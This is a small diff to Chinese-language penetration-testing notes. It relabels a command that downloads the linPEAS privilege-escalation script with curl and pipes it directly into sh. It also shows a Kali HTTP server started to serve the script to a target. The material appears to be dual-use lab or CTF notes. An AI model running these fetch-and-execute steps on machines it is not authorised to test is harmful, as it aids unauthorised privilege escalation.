@@ -2,7 +2,7 @@
 
 ```bash
 # 从云端下载脚本执行
-$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+Machine: $ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 # 从本地下载脚本执行
 Kali:    $ sudo python3 -m http.server 80
